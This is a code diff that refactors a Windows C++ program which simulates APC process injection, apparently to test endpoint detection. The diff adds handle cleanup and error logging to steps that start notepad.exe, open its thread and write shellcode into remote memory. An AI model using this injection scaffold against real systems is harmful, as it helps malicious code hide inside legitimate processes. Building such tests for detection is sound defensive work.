@@ -18,12 +18,49 @@
 #include <tlhelp32.h>
 #include <iostream>
 
-// Enumerate threads of a process
+// RAII wrapper for HANDLE to ensure automatic cleanup
+class HandleGuard {
+private:
+    HANDLE handle;
+    
+public:
+    HandleGuard(HANDLE h) : handle(h) {}
+    ~HandleGuard() {
+        if (handle && handle != INVALID_HANDLE_VALUE) {
+            CloseHandle(handle);
+        }
+    }
+    
+    HANDLE get() const { return handle; }
+    bool isValid() const { return handle && handle != INVALID_HANDLE_VALUE; }
+    
+    // Prevent copying
+    HandleGuard(const HandleGuard&) = delete;
+    HandleGuard& operator=(const HandleGuard&) = delete;
+};
+
+// Validate executable path
+bool ValidateExecutablePath(const std::wstring& exePath) {
+    DWORD fileAttributes = GetFileAttributesW(exePath.c_str());
+    
+    if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
+        std::wcerr << L"[-] Executable not found at: " << exePath << std::endl;
+        std::wcerr << L"    Error: " << GetLastError() << std::endl;
+        return false;
+    }
+    
+    return true;
+}
+
+// Enumerate threads of a process with improved error logging
 DWORD GetThreadId(DWORD processId) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
+        std::wcerr << L"[-] Failed to create thread snapshot. Error: " << GetLastError() << std::endl;
         return 0;
     }
+
+    HandleGuard snapshotGuard(hSnapshot);
 
     THREADENTRY32 te;
     te.dwSize = sizeof(THREADENTRY32);
@@ -31,13 +68,11 @@ DWORD GetThreadId(DWORD processId) {
     if (Thread32First(hSnapshot, &te)) {
         do {
             if (te.th32OwnerProcessID == processId) {
-                CloseHandle(hSnapshot);
                 return te.th32ThreadID;
             }
         } while (Thread32Next(hSnapshot, &te));
     }
 
-    CloseHandle(hSnapshot);
     return 0;
 }
 
@@ -51,17 +86,29 @@ void SimulateApcInjection() {
     // Step 1: Create target process
     std::wcout << L"[1] Creating target process (notepad.exe)..." << std::endl;
     
+    std::wstring notepadPath = L"C:\\Windows\\System32\\notepad.exe";
+    
+    // Validate path exists
+    if (!ValidateExecutablePath(notepadPath)) {
+        std::wcerr << L"[-] Cannot proceed: notepad.exe not found" << std::endl;
+        return;
+    }
+    
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
 
     if (!CreateProcessW(
-        L"C:\\Windows\\System32\\notepad.exe",
+        notepadPath.c_str(),
         NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
-        std::wcerr << L"[-] Failed to create process" << std::endl;
+        std::wcerr << L"[-] Failed to create process. Error: " << GetLastError() << std::endl;
         return;
     }
+
+    // Use RAII for automatic cleanup
+    HandleGuard processGuard(pi.hProcess);
+    HandleGuard threadGuard(pi.hThread);
 
     std::wcout << L"[+] Process created" << std::endl;
     std::wcout << L"    PID: " << pi.dwProcessId << std::endl;
@@ -75,8 +122,6 @@ void SimulateApcInjection() {
     if (threadId == 0) {
         std::wcerr << L"[-] Failed to get thread ID" << std::endl;
         TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
         return;
     }
 
@@ -87,13 +132,12 @@ void SimulateApcInjection() {
     HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
     
     if (!hThread) {
-        std::wcerr << L"[-] Failed to open thread" << std::endl;
+        std::wcerr << L"[-] Failed to open thread. Error: " << GetLastError() << std::endl;
         TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
         return;
     }
 
+    HandleGuard threadHandleGuard(hThread);
     std::wcout << L"[+] Thread handle obtained" << std::endl;
 
     // Step 4: Allocate memory for shellcode
@@ -115,27 +159,28 @@ void SimulateApcInjection() {
     );
 
     if (!pRemoteMemory) {
-        std::wcerr << L"[-] Failed to allocate memory" << std::endl;
-        CloseHandle(hThread);
+        std::wcerr << L"[-] Failed to allocate memory. Error: " << GetLastError() << std::endl;
         TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
         return;
     }
 
     std::wcout << L"[+] Memory allocated at: 0x" << std::hex 
                << (DWORD_PTR)pRemoteMemory << std::dec << std::endl;
 
+    // Ensure memory cleanup
+    auto memoryCleanup = [&pRemoteMemory, piProcess = pi.hProcess]() {
+        if (pRemoteMemory) {
+            VirtualFreeEx(piProcess, pRemoteMemory, 0, MEM_RELEASE);
+        }
+    };
+
     // Step 5: Write shellcode
     std::wcout << L"\n[5] Writing shellcode to target process..." << std::endl;
     
     if (!WriteProcessMemory(pi.hProcess, pRemoteMemory, shellcode, shellcodeSize, NULL)) {
-        std::wcerr << L"[-] Failed to write memory" << std::endl;
-        VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hThread);
+        std::wcerr << L"[-] Failed to write memory. Error: " << GetLastError() << std::endl;
+        memoryCleanup();
         TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
         return;
     }
 
@@ -151,11 +196,8 @@ void SimulateApcInjection() {
 
     // Cleanup
     std::wcout << L"\n[*] Cleaning up..." << std::endl;
-    VirtualFreeEx(pi.hProcess, pRemoteMemory, 0, MEM_RELEASE);
-    CloseHandle(hThread);
+    memoryCleanup();
     TerminateProcess(pi.hProcess, 0);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
 
     std::wcout << L"\n[+] Test completed!" << std::endl;
     std::wcout << L"\nEDR Detection Points:" << std::endl;
